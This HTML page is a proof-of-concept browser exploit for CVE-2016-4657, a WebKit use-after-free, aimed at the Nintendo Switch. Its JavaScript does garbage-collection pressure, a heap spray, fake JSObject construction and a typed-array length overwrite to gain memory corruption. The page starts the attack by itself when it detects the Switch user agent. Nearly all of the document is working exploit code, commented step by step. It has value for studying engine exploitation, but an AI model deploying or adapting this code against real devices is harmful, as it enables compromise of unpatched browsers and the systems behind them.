<!doctype html>
<html>
    <head>
        <title>CVE-2016-4657 Switch PoC</title>
        <style>
            body {font-size: 2em;}
            a {text-decoration: none; color: #000;}
            a:hover {color: #f00; font-weight: bold;}
        </style>
    </head>
    <body>
        <h1>CVE-2016-4657 Nintendo Switch PoC</h1>
        <ul>
            <li><a href=\'javascript:go();\'> go!</a></li>
            <li><a href=\'javascript:document.location.reload();\'> reload</a></li>
        </ul>
        <div id=\'status\'> waiting... click go.</div>

            <script>
                // display JS errors as alerts. Helps debugging.
                window.onerror = function(error, url, line) {
                    alert(error+\' URL:\'+url+\' L:\'+line);
                };
            </script>
            <script>

                // based on jbme.qwertyoruiop.com
                // Thanks to:
                //  + qwertyoruiop
                //  + Retr0id
                //  + Ando
                //
                // saelo\'s phrack article is invaluable: http://www.phrack.org/papers/attacking_javascript_engines.html

                // garbage collection stuff
                var pressure = new Array(100);
                // do garbage collect
                dgc = function() {
                    for (var i = 0; i < pressure.length; i++) {
                        pressure[i] = new Uint32Array(0x10000);
                    }
                    for (var i = 0; i < pressure.length; i++) {
                        pressure[i] = 0;
                    }
                }


                // access to the overlapping Uint32Array
                var bufs = new Array(0x1000);
                // we will modify the vector of this
                var smash = new Uint32Array(0x10);
                // the array with the stale pointer
                var stale = 0;

                var _dview = null;
                // write 2x 32bit in a DataView and get the Float representation of it
                function u2d(low, hi) {
                    if (!_dview) _dview = new DataView(new ArrayBuffer(16));
                    _dview.setUint32(0, hi);
                    _dview.setUint32(4, low);
                    return _dview.getFloat64(0);
                }

                function go_() {
                    // check if the length of the array smash changed already. if yes, bail out.
                    if (smash.length != 0x10) return;

                    // garbage collect
                    dgc();

                    // new array with 0x100 elements
                    var arr = new Array(0x100);

                    // new array buffer of length 0x1000
                    var yolo = new ArrayBuffer(0x1000);

                    // populate the arr with pointer to yolo and a number. not quite sure why.
                    arr[0] = yolo;
                    arr[1] = 0x13371337;

                    // create an object whos toString function returns number 10 and messes with arr.
                    var not_number = {};
                    not_number.toString = function() {
                        arr = null;
                        props[\"stale\"][\"value\"] = null;

                        // if bufs is already overlapping memory, bail out.
                        if (bufs[0]) return 10;
                        // really make sure garbage is collected
                        // the array pointed at by arr should be gone now.
                        for (var i = 0; i < 20; i++) {
                            dgc();
                        }
                        // for the whole buf Array
                        for (i = 0; i < bufs.length; i++) {
                            // fill it with a lot of Uint32Arrays, hopefully allocated where arr was earlier
                            bufs[i] = new Uint32Array(0x100 * 2)
                            // for each element of that array
                            for (k = 0; k < bufs[i].length;) {
                                // set memory to 0x41414141 0xffff0000
                                // basically spraying the JSValue 0xffff000041414141
                                // which is the Integer 0x41414141
                                // phrack: Integer FFFF:0000:IIII:IIII
                                bufs[i][k++] = 0x41414141;
                                bufs[i][k++] = 0xffff0000;
                            }
                        }
                        return 10;
                    };
                    // define a new object with some properties
                    var props = {
                        p0: { value: 0 },
                        p1: { value: 1 },
                        p2: { value: 2 },
                        p3: { value: 3 },
                        p4: { value: 4 },
                        p5: { value: 5 },
                        p6: { value: 6 },
                        p7: { value: 7 },
                        p8: { value: 8 },
                        // the length of this object is set to this object that does evil stuff with toString()
                        length: { value: not_number },
                        // the reference to the arr array. Which will later be freed.
                        stale: { value: arr },
                        after: { value: 666 }
                    };
                    // define a new target array
                    var target = [];

                    // TRIGGER BUG!
                    // set the properties of the target based on the previously defined ones
                    Object.defineProperties(target, props);

                    // get a reference to the target stale property, which points to arr
                    stale = target.stale;

                    // make sure that the stale[0] points actually to the 0x41414141 data if not, we don\'t wanna mess with it and try again
                    if(stale[0]==0x41414141) {
                        // stale[0] is now pointing at a fake Integer 0x41414141. Now make it 0x41414242
                        stale[0] += 0x101;
                        //stale[0] = 0x41414242;
                        //document.getElementById(\'status\').innerText = \'bug done.\';
                        // searching the whole memory that is overlaying the old arr. Looking for 0x41414242
                        for (i = 0; i < bufs.length; i++) {
                            for (k = 0; k < bufs[0].length; k++) {
                                // Found the value! bufs[i][k] point now at the same memory as stale[0]
                                if (bufs[i][k] == 0x41414242) {
                                    alert(\'Overlapping Arrays found at bufs[\'+i+\'][\'+k+\']\\nsmash.length is still: 0x\'+smash.length.toString(16));

                                    // create a new object. Will look kinda like this:
                                    // 0x0100150000000136 0x0000000000000000 <- fictional value
                                    // 0x0000000000000064 0x0000000000000000 <- [\'a\'],[\'b\']
                                    // 0x???????????????? 0x0000000000000100 <- [\'c\'],[\'d\']
                                    stale[0] = {
                                        \'a\': u2d(105, 0), // the JSObject properties ; 105 is the Structure ID of Uint32Array
                                        \'b\': u2d(0, 0),
                                        \'c\': smash, // var pointing at the struct of a Uint32Array(0x10)
                                        \'d\': u2d(0x100, 0)
                                    }

                                    alert(\'created the JSObject.\\nstale[0] = \'+stale[0]);

                                    // remember the original stale pointer, pointing at the object with the a,b,c,d properties
                                    stale[1] = stale[0];

                                    // now add 0x10 to the pointer of stale[0], which points now in the middle of the object.
                                    bufs[i][k] += 0x10;
                                    // check the type of stale[0].

                                    // removed the loop because it makes the exploit sooooooo unreliable
                                    // based on phrack paper - Predicting structure IDs (http://www.phrack.org/papers/attacking_javascript_engines.html)
                                    /*while(!(stale[0] instanceof Uint32Array)) {
                                        // if stale[0] is not a Uint32Array yet, increment the structureID guess
                                        structureID++;

                                        // assign the next structureID to the original object still referenced by stale[1]
                                        stale[1][\'a\'] = u2d(structureID, 0);
                                    }*/

                                    // Give some information. stale[0] should now be a Uint32Array
                                    alert(\'misaligned the pointer to the JSObject.\\nstale[0] = \'+stale[0]+\'\');

                                    // write to the 6th 32bit value of the memory pointed to by the crafted Uint32Array
                                    // which should point to the struct of smash, allowing us to overwrite the length of smash
                                    stale[0][6] = 0x1337;

                                    // check the length of smash is now.
                                    alert(\'smash.length is now: 0x\'+smash.length.toString(16));

                                    alert(\'done!\\nswitch will probably crash now :O\');
                                    return;
                                }
                            }
                        }
                    }
                    document.getElementById(\'status\').innerText = \' fail. refresh the page and try again...\';
                    setTimeout(function() {document.location.reload();}, 1000);
                }

                function go() {
                    document.getElementById(\'status\').innerText = \' go! \';
                    dgc();
                    dgc();
                    dgc();
                    dgc();
                    dgc();
                    dgc();
                    setTimeout(go_, 500);
                }

                // if Switch browser is detected, auto start exploit
                if(navigator.userAgent.indexOf(\'Nintendo Switch\')>-1) {
                    document.getElementById(\'status\').innerText = \'Found Nintendo Switch! \';
                    setTimeout(go, 2000);
                }
            </script>
    </body>
</html>